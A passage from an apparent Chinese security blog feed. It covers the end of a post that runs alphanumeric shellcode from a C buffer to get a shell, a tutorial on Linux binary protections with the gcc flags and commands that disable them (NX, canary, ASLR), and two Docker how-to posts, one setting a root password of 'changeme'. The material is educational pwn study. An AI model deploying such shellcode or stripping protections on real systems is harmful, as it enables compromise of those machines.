<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="comment">//    char shellcode[] = "PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx";</span></div><div class="line">    <span class="keyword">char</span> shellcode[] = <span class="string">"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIRJTKV8MIPR2FU86M3SLIZG2H6O43SX30586OCRCYBNLIM3QBKXDHS0C0EPVOE22IBNFO3CBH5P0WQCK9KQXMK0AA"</span>;</div><div class="line">    (*(<span class="keyword">void</span> (*)())shellcode)();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>关闭NX保护:</p>
<blockquote>
<p>gcc -z execstack -o test test.c</p>
</blockquote>
<p>运行之后获得shell</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://inaz2.hatenablog.com/entry/2014/07/11/004655" target="_blank" rel="external">http://inaz2.hatenablog.com/entry/2014/07/11/004655</a></p>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linux程序的常用保护机制]]></title>
      <url>/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
      <content type="html"><![CDATA[<p>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR（Linux下对应PIE）等机制，例如存在DEP（NX）的话就不能直接执行栈上的数据，存在ASLR的话各个系统调用的地址就是随机化的。</p>
<h2 id="一、checksec"><a href="#一、checksec" class="headerlink" title="一、checksec"></a>一、checksec</h2><p>checksec是一个脚本软件，也就是用脚本写的一个文件，不到2000行，可用来学习shell。</p>
<p>源码参见</p>
<p><a href="http://www.trapkit.de/tools/checksec.html" target="_blank" rel="external">http://www.trapkit.de/tools/checksec.html</a></p>
<p><a href="https://github.com/slimm609/checksec.sh/" target="_blank" rel="external">https://github.com/slimm609/checksec.sh/</a></p>
<p>下载方法之一为</p>
<p>wget <a href="https://github.com/slimm609/checksec.sh/archive/1.6.tar.gz" target="_blank" rel="external">https://github.com/slimm609/checksec.sh/archive/1.6.tar.gz</a></p>
<p>checksec到底是用来干什么的？</p>
<p>它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。</p>
<p>checksec的使用方法：<br><img src="/images/2017-09-30/20160920223340302.png" alt="img"></p>
<p>checksec –file /usr/sbin/sshd<br><img src="/images/2017-09-30/20160920235408000.png" alt="img"></p>
<p>一般来说，如果是学习二进制漏洞利用的朋友，建议大家使用gdb里peda插件里自带的checksec功能，如下：</p>
<p><img src="/images/2017-09-30/acc5016c0ac57277.png" alt="img"></p>
<p>下面我们就图中各个保护机制进行一个大致的了解。</p>
<h2 id="二、CANNARY-栈保护"><a href="#二、CANNARY-栈保护" class="headerlink" title="二、CANNARY(栈保护)"></a>二、CANNARY(栈保护)</h2><p>这个选项表示栈保护功能有没有开启。</p>
<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
<p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。</p>
<p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gcc -o test test.c						// 默认情况下，不开启Canary保护</div><div class="line">gcc -fno-stack-protector -o test test.c  //禁用栈保护</div><div class="line">gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</div><div class="line">gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</div></pre></td></tr></table></figure>
<h2 id="三、FORTIFY"><a href="#三、FORTIFY" class="headerlink" title="三、FORTIFY"></a>三、FORTIFY</h2><p>fority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。</p>
<p>_FORTIFY_SOURCE设为1，并且将编译器设置为优化1(<em>gcc -O1</em>)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能</p>
<p>_FORTIFY_SOURCE设为2，有些检查功能会加入，但是这可能导致程序崩溃。</p>
<p><code>gcc -D_FORTIFY_SOURCE=1</code> 仅仅只会在编译时进行检查 (特别像某些头文件 <code>#include &lt;string.h&gt;</code>)</p>
<p><code>gcc -D_FORTIFY_SOURCE=2</code> 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序)</p>
<p>举个例子可能简单明了一些：<br>一段简单的存在缓冲区溢出的C代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">void fun(char *s) &#123;</div><div class="line">        char buf[0x100];</div><div class="line">        strcpy(buf, s);</div><div class="line">        /* Don&apos;t allow gcc to optimise away the buf */</div><div class="line">        asm volatile(&quot;&quot; :: &quot;m&quot; (buf));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>用包含参数-U_FORTIFY_SOURCE编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">08048450 &lt;fun&gt;:</div><div class="line">  push   %ebp               ; </div><div class="line">  mov    %esp,%ebp</div><div class="line"></div><div class="line">  sub    $0x118,%esp        ; 将0x118存储到栈上</div><div class="line">  mov    0x8(%ebp),%eax     ; 将目标参数载入eax</div><div class="line">  mov    %eax,0x4(%esp)     ; 保存目标参数</div><div class="line">  lea    -0x108(%ebp),%eax  ; 数组buf</div><div class="line">  mov    %eax,(%esp)        ; 保存</div><div class="line">  call   8048320 &lt;strcpy@plt&gt;</div><div class="line"></div><div class="line">  leave                     ; </div><div class="line">  ret</div></pre></td></tr></table></figure>
<p>用包含参数-D_FORTIFY_SOURCE=2编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">08048470 &lt;fun&gt;:</div><div class="line">  push   %ebp               ; </div><div class="line">  mov    %esp,%ebp</div><div class="line"></div><div class="line">  sub    $0x118,%esp        ; </div><div class="line">  movl   $0x100,0x8(%esp)   ; 把0x100当作目标参数保存</div><div class="line">  mov    0x8(%ebp),%eax     ; </div><div class="line">  mov    %eax,0x4(%esp)     ; </div><div class="line">  lea    -0x108(%ebp),%eax  ; </div><div class="line">  mov    %eax,(%esp)        ; </div><div class="line">  call   8048370 &lt;__strcpy_chk@plt&gt;</div><div class="line"></div><div class="line">  leave                      ; </div><div class="line">  ret</div></pre></td></tr></table></figure>
<p>我们可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p>
<p>总结下就有:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">gcc -o test test.c							// 默认情况下，不会开这个检查</div><div class="line">gcc -D_FORTIFY_SOURCE=1 -o test test.c		// 较弱的检查</div><div class="line">gcc -D_FORTIFY_SOURCE=2 -o test test.c		// 较强的检查</div></pre></td></tr></table></figure>
<h2 id="四、NX（DEP）"><a href="#四、NX（DEP）" class="headerlink" title="四、NX（DEP）"></a>四、NX（DEP）</h2><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
<p>工作原理如图：<br><img src="/images/2017-09-30/13164110_201107181702402.jpg" alt="img"><br>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">gcc -o test test.c					// 默认情况下，开启NX保护</div><div class="line">gcc -z execstack -o test test.c		// 禁用NX保护</div><div class="line">gcc -z noexecstack -o test test.c	// 开启NX保护</div></pre></td></tr></table></figure>
<p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p>
<h2 id="五、PIE（ASLR）"><a href="#五、PIE（ASLR）" class="headerlink" title="五、PIE（ASLR）"></a>五、PIE（ASLR）</h2><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p>
<p>内存地址随机化机制（address space layout randomization)，有以下三种情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0 - 表示关闭进程地址空间随机化。</div><div class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</div><div class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</div></pre></td></tr></table></figure>
<p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>
<p>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p>
<p>liunx下关闭PIE的命令如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</div></pre></td></tr></table></figure>
<p>gcc编译命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">gcc -o test test.c				// 默认情况下，不开启PIE</div><div class="line">gcc -fpie -pie -o test test.c		// 开启PIE，此时强度为1</div><div class="line">gcc -fPIE -pie -o test test.c		// 开启PIE，此时为最高强度2</div><div class="line">gcc -fpic -o test test.c		// 开启PIC，此时强度为1，不会开启PIE</div><div class="line">gcc -fPIC -o test test.c		// 开启PIC，此时为最高强度2，不会开启PIE</div></pre></td></tr></table></figure>
<font color="#f00">说明：</font>

<p>PIE最早由RedHat的人实现，他在连接起上增加了-pie选项，这样使用-fPIE编译的对象就能通过连接器得到位置无关可执行程序。fPIE和fPIC有些不同。可以参考<a href="http://writeblog.csdn.net/2009/11/20/10065/" target="_blank" rel="external">Gcc和Open64中的-fPIC选项</a>.</p>
<p>gcc中的-fpic选项，使用于在目标机支持时，编译共享库时使用。编译出的代码将通过全局偏移表(Global Offset<br>Table)中的常数地址访存，动态装载器将在程序开始执行时解析GOT表项(注意，动态装载器操作系统的一部分，连接器是GCC的一部分)。而gcc中的-fPIC选项则是针对某些特殊机型做了特殊处理，比如适合动态链接并能避免超出GOT大小限制之类的错误。而Open64仅仅支持不会导致GOT表溢出的PIC编译。</p>
<p>gcc中的-fpie和-fPIE选项和fpic及fPIC很相似，但不同的是，除了生成为位置无关代码外，还能假定代码是属于本程序。通常这些选项会和GCC链接时的-pie选项一起使用。fPIE选项仅能在编译可执行码时用，不能用于编译库。所以，如果想要PIE的程序，需要你除了在gcc增加-fPIE选项外，还需要在ld时增加-pie选项才能产生这种代码。即gcc -fpie -pie来编译程序。单独使用哪一个都无法达到效果。</p>
<h2 id="六、RELRO"><a href="#六、RELRO" class="headerlink" title="六、RELRO"></a>六、RELRO</h2><p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.</p>
<p>GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</p>
<p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p>
<p>gcc编译：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gcc -o test test.c						// 默认情况下，是Partial RELRO</div><div class="line">gcc -z norelro -o test test.c			// 关闭，即No RELRO</div><div class="line">gcc -z lazy -o test test.c				// 部分开启，即Partial RELRO</div><div class="line">gcc -z now -o test test.c				// 全部开启，即</div></pre></td></tr></table></figure>
<h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><p>各种安全选择的编译参数如下：</p>
<ul>
<li>NX：<code>-z execstack</code> / <code>-z noexecstack</code> (关闭 / 开启)</li>
<li>Canary：<code>-fno-stack-protector</code> /<code>-fstack-protector</code> / <code>-fstack-protector-all</code> (关闭 / 开启 / 全开启)</li>
<li>PIE：<code>-no-pie</code> / <code>-pie</code> (关闭 / 开启)</li>
<li>RELRO：<code>-z norelro</code> / <code>-z lazy</code> / <code>-z now</code> (关闭 / 部分开启 / 完全开启)</li>
</ul>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[docker操作指南]]></title>
      <url>/2017/09/28/docker%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/</url>
      <content type="html"><![CDATA[<h3 id="1、运行ubuntu等容器"><a href="#1、运行ubuntu等容器" class="headerlink" title="1、运行ubuntu等容器"></a>1、运行ubuntu等容器</h3><ul>
<li>后台运行系统镜像</li>
</ul>
<blockquote>
<p>docker run -it -d ubuntu</p>
</blockquote>
<ul>
<li>直接运行镜像，退出后这个镜像也停止</li>
</ul>
<blockquote>
<p>docker run -it ubuntu</p>
</blockquote>
<ul>
<li>映射端口(22端口映射出来，一般代表可以通过ssh登录)</li>
</ul>
<blockquote>
<p>docker run -it -p 80:80 2222:22 -d ubuntu</p>
</blockquote>
<ul>
<li>映射文件夹</li>
</ul>
<blockquote>
<p>docker run -it -v /outer/tmp:/inner/tmp -d ubuntu</p>
</blockquote>
<ul>
<li>选择网络模式</li>
</ul>
<blockquote>
<p>docker run -it --net=&quot;host&quot; -d ubuntu</p>
</blockquote>
<h3 id="2、操作容器"><a href="#2、操作容器" class="headerlink" title="2、操作容器"></a>2、操作容器</h3><ul>
<li>直接运行命令</li>
</ul>
<blockquote>
<p>docker exec -it Container-ID  /bin/cat flag</p>
</blockquote>
<ul>
<li>attach到容器中（限制极大，多个终端同时进行操纵时，容易发生冲突）</li>
</ul>
<blockquote>
<p>docker attach-it Container-ID</p>
</blockquote>
<ul>
<li>进入容器中运行指令</li>
</ul>
<blockquote>
<p>docker exec -it Container-ID /bin/bash</p>
</blockquote>
<ul>
<li>从容器内拷贝文件到主机上</li>
</ul>
<blockquote>
<p>docker cp \&lt;containerId>:/file/path/within/container /host/path/target </p>
</blockquote>
<ul>
<li>从容器内拷贝文件到主机上</li>
</ul>
<blockquote>
<p>docker cp /host/path/target  \&lt;containerId>:/file/path/within/container</p>
</blockquote>
<h3 id="3、网络模式"><a href="#3、网络模式" class="headerlink" title="3、网络模式"></a>3、网络模式</h3><p>（1）    bridge模式</p>
<p>使用—net=bridge指定，为Docker的默认设置。这种模式是将容器用docker的网桥连接起来。</p>
<p>作为最常规的格式，bridge模式已经可以满足Docker容器最基本的使用需求。然而其在于外界通信使用NAT协议，增加了通信的复杂性，在复杂的场景下使用会有诸多限制。</p>
<p>（2）    host模式</p>
<p>host模式下，容器不会拥有自己的网络命名空间。Docker容器中的进程处于宿主机的网络环境中，此时Docker容器和宿主机之间网络没有映射关系，外界可以通过该主机的IP地址、端口等进行Docker容器的访问。当然，除了network namespace外，其他内容宿主机是隔离的。host模式不用地址映射，可以直接使用宿主机的IP。但是也降低了隔离性，而且由于网络资源一直被竞争，所以可能造成网络的短暂不可用问题。</p>
<p>（3）    container模式</p>
<p>container模式是指新创建的容器与已有的容器共享网络信息。在此种模式下，新创建的容器与指定的容器共享IP、端口等。当然，两个容器之间除了网络信息共享外，其它内容均不可共用。由于在这种模式下，两个容器的进程使用回环网卡通信，所以通讯速率加快了。container模式的主要用于部署多个相关的应用，最好能成为一个整体。由于container模式的特点，导致了这种模式隔离性不强，可能会存在安全隐患。</p>
<p>（4）    none模式</p>
<p>none模式时，Docker拥有网络协议栈，但是没有对协议栈进行配置。这时，Docker容器的网卡以及IP，均为用户所配置。一般而言，当未给使用这种模式的容器进行网络配置时，用户无法正常使用容器进程，但是优点也很明显，它给用户最大的自由度来自定义容器的网络环境。</p>
<h3 id="4、docker-CMD执行-容器内没有后台服务的概念"><a href="#4、docker-CMD执行-容器内没有后台服务的概念" class="headerlink" title="4、docker CMD执行 容器内没有后台服务的概念"></a>4、docker CMD执行 容器内没有后台服务的概念</h3><p>提到 CMD 就不得不提容器中应用在前台执行和后台执行的问题。这是初学者常出现的一个混<br>淆。</p>
<p>Docker 不是虚拟机，容器中的应用都应该以前台执行，而不是像虚拟机、物理机里面那样，</p>
<p>用 upstart/systemd 去启动后台服务，容器内没有后台服务的概念。</p>
<p>一些初学者将 CMD 写为：</p>
<blockquote>
<p> CMD service nginx start</p>
</blockquote>
<p>然后发现容器执行后就立即退出了。甚至在容器内去使用 systemctl 命令结果却发现根本执</p>
<p>行不了。这就是因为没有搞明白前台、后台的概念，没有区分容器和虚拟机的差异，依旧在</p>
<p>以传统虚拟机的角度去理解容器。</p>
<p>对于容器而言，其启动程序就是容器应用进程，容器就是为了主进程而存在的，主进程退</p>
<p>出，容器就失去了存在的意义，从而退出，其它辅助进程不是它需要关心的东西。</p>
<p>而使用 service nginx start 命令，则是希望 upstart 来以后台守护进程形式启动 nginx 服</p>
<p>务。而刚才说了 CMD service nginx start 会被理解为 CMD [ &quot;sh&quot;, &quot;-c&quot;, &quot;service nginx</p>
<p>start&quot;] ，因此主进程实际上是 sh 。那么当 service nginx start 命令结束后， sh 也就结</p>
<p>束了， sh 作为主进程退出了，自然就会令容器退出。</p>
<p>正确的做法是直接执行 nginx 可执行文件，并且要求以前台形式运行。比如：</p>
<blockquote>
<p>CMD [&quot;nginx&quot;, &quot;-g&quot;, &quot;daemon off;&quot;]</p>
<p>或者:</p>
<p>nginx -g &quot;daemon off;&quot;</p>
</blockquote>
<h3 id="5、解决上述问题的办法"><a href="#5、解决上述问题的办法" class="headerlink" title="5、解决上述问题的办法"></a>5、解决上述问题的办法</h3><h4 id="5-1-supervisor"><a href="#5-1-supervisor" class="headerlink" title="5.1 supervisor"></a>5.1 supervisor</h4><p>最近看了一个github项目，完美解决这类问题</p>
<p><a href="https://github.com/nickistre/docker-lamp/tree/ubuntu-14.04" target="_blank" rel="external">https://github.com/nickistre/docker-lamp/tree/ubuntu-14.04</a></p>
<p>主要做法是加入了supervisd。CMD中的指令一般只有一条，所以建议使用run.sh</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">RUN apt-get install -y supervisor</div><div class="line">RUN mkdir -p /var/log/supervisor</div><div class="line">ADD supervisord.conf /etc/</div><div class="line">#ADD test.conf /etc/supervisord/conf.d/</div><div class="line">CMD [&quot;supervisord&quot;, &quot;-n&quot;]</div><div class="line">#CMD [&quot;/run.sh&quot;]</div></pre></td></tr></table></figure>
<p>改密码的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">RUN echo &apos;root:changeme&apos; | chpasswd</div></pre></td></tr></table></figure>
<p>而语法规则可以参考文档<a href="http://supervisord.org/configuration.html" target="_blank" rel="external">http://supervisord.org/configuration.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">[supervisord]</div><div class="line">;logfile=/var/log/supervisor/supervisord-nobody.log  ; (main log file;default $CWD/supervisord.log)</div><div class="line">;logfile_maxbytes=50MB       ; (max main logfile bytes b4 rotation;default 50MB)</div><div class="line">;logfile_backups=10          ; (num of main logfile rotation backups;default 10)</div><div class="line">;loglevel=info               ; (log level;default info; others: debug,warn,trace)</div><div class="line">;pidfile=/var/run/supervisord.pid ; (supervisord pidfile;default supervisord.pid)</div><div class="line">nodaemon=true                ; (start in foreground if true;default false)</div><div class="line">;user=nobody</div><div class="line"></div><div class="line">[rpcinterface:supervisor]</div><div class="line">supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface</div><div class="line"></div><div class="line">;[unix_http_server]</div><div class="line">;file = /supervisor.sock</div><div class="line">;chmod = 0777</div><div class="line">;chown= nobody:nogroup</div><div class="line">;username = user</div><div class="line">;password = 123</div><div class="line"></div><div class="line">[inet_http_server]</div><div class="line">port = 127.0.0.1:9001</div><div class="line"></div><div class="line">[supervisorctl]</div><div class="line">;serverurl=unix:///tmp/supervisor.sock</div><div class="line">serverurl=http://127.0.0.1:9001</div><div class="line"></div><div class="line">[program:apache2]</div><div class="line">command=/bin/bash -c &quot;source /etc/apache2/envvars &amp;&amp; exec /usr/sbin/apache2 -DFOREGROUND&quot;</div><div class="line">numprocs=1</div><div class="line">autostart=true</div><div class="line"></div><div class="line"></div><div class="line">;autostart=true                 ; start at supervisord start (default: true)</div><div class="line">;autorestart=true               ; retstart at unexpected quit (default: true)</div><div class="line">;startretries=3                 ; max # of serial start failures (default 3)</div><div class="line"></div><div class="line">[program:mysql]</div><div class="line">command = /usr/bin/pidproxy /var/run/mysqld/mysqld.pid /usr/bin/mysqld_safe</div><div class="line">numprocs=1</div><div class="line">autostart=true</div></pre></td></tr></table></figure>
<h4 id="5-2-无限循环"><a href="#5-2-无限循环" class="headerlink" title="5.2 无限循环"></a>5.2 无限循环</h4><p>main.sh</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line"></div><div class="line">echo &apos;[+] Starting mysql...&apos;</div><div class="line">service mysql start</div><div class="line"></div><div class="line">echo &apos;[+] Starting apache&apos;</div><div class="line">service apache2 start</div><div class="line"></div><div class="line">while true</div><div class="line">do</div><div class="line">    tail -f /var/log/apache2/*.log</div><div class="line">    exit 0</div><div class="line">done</div></pre></td></tr></table></figure>
<p>run.sh</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line"></div><div class="line">#sshd</div><div class="line">echo &quot;=&gt; start sshd&quot;</div><div class="line">exec /usr/sbin/sshd &amp;</div><div class="line">echo &quot;=&gt; sshd started&quot;</div><div class="line"></div><div class="line">VOLUME_HOME=&quot;/var/lib/mysql&quot;</div><div class="line"></div><div class="line">sed -ri -e &quot;s/^upload_max_filesize.*/upload_max_filesize = $&#123;PHP_UPLOAD_MAX_FILESIZE&#125;/&quot; \</div><div class="line">    -e &quot;s/^post_max_size.*/post_max_size = $&#123;PHP_POST_MAX_SIZE&#125;/&quot; /etc/php5/apache2/php.ini</div><div class="line">if [[ ! -d $VOLUME_HOME/mysql ]]; then</div><div class="line">    echo &quot;=&gt; An empty or uninitialized MySQL volume is detected in $VOLUME_HOME&quot;</div><div class="line">    echo &quot;=&gt; Installing MySQL ...&quot;</div><div class="line">    mysql_install_db &gt; /dev/null 2&gt;&amp;1</div><div class="line">    echo &quot;=&gt; Done!&quot;</div><div class="line">    /create_mysql_admin_user.sh</div><div class="line">else</div><div class="line">    echo &quot;=&gt; Using an existing volume of MySQL&quot;</div><div class="line">fi</div><div class="line"></div><div class="line">exec supervisord -n</div></pre></td></tr></table></figure>
<p>Start-apache2.sh</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">source /etc/apache2/envvars</div><div class="line">exec apache2 -D FOREGROUND</div></pre></td></tr></table></figure>
<p>Start-mysql.sh</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">exec mysqld_safe</div></pre></td></tr></table></figure>
<p>在脚本中，最好使用下面的这类后台指令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">exec /usr/sbin/sshd &amp;</div></pre></td></tr></table></figure>
<p>在shell中，内建（builtin）命令exec，格式如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">exec [-cl] [-a name] [command [arguments]]1</div></pre></td></tr></table></figure>
<p>exec命令，如果指定了command，它就会取代当前的shell而不是创建新的进程，所以命令执行完毕后shell也就退出了。如果设置了“-l”即login选项，在command的第0个参数前会添加符号“-”，这是login所需的。如果设置了“-c”即clear选项，command命令将在一个空的环境中执行。如果指定了“-a name”选项，name会作为第0个参数传给command。若没有指定command，可以使用重定向来影响当前的shell。重定向成功时退出状态为0，否则为1。</p>
<p>exec后面的命令如果是多个简单命令组合而成的复合命令，只执行第一个命令，可以把这些符合命令写入shell脚本中，然后通过exec执行这个脚本，此时脚本中所有的命令都会执行。</p>
]]></content>
      
        <categories>
            
            <category> 虚拟化 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> docker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[docker简介]]></title>
      <url>/2017/09/28/docker%E7%AE%80%E4%BB%8B/</url>
      <content type="html"><![CDATA[<p>此文作为我以前一篇文章的裁剪，没有十分详尽地展现所有内容，对此我深感抱歉！</p>
<h2 id="1-Docker容器技术"><a href="#1-Docker容器技术" class="headerlink" title="1 Docker容器技术"></a>1 Docker容器技术</h2><h3 id="1-1-Docker容器技术概述"><a href="#1-1-Docker容器技术概述" class="headerlink" title="1.1 Docker容器技术概述"></a>1.1 Docker容器技术概述</h3><p>Docker是一种新型的容器技术，已经在成为云计算的核心技术之一。Docker是为了解决依赖地域问题而产生的。Docker使用命名空间将各个容器进行隔离，并使用Namespace来对端口、层次进行隔离，使用AUFS技术进行分层并复用共同的层，以达到减少空间使用量。</p>
<h3 id="1-2-Docker网络通信"><a href="#1-2-Docker网络通信" class="headerlink" title="1.2 Docker网络通信"></a>1.2 Docker网络通信</h3><p>Docker容器有以下几种网络模式。</p>
<p>（1）    bridge模式</p>
<p>使用—net=bridge指定，为Docker的默认设置。这种模式是将容器用docker的网桥连接起来。</p>
<p>作为最常规的格式，bridge模式已经可以满足Docker容器最基本的使用需求。然而其在于外界通信使用NAT协议，增加了通信的复杂性，在复杂的场景下使用会有诸多限制。</p>
